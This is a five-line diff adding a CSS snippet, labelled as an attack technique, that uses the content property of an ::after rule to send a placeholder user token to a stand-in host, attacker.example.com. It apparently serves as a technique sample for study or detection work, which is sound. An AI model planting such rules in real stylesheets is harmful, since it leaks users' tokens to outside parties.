@@ -1,0 +1,5 @@
+/* TTP: Use content property to exfil data or build dynamic requests. */
+
+.exfil-me::after {
+    content: url("https://attacker.example.com/exfil?secret=USER_TOKEN");
+  }
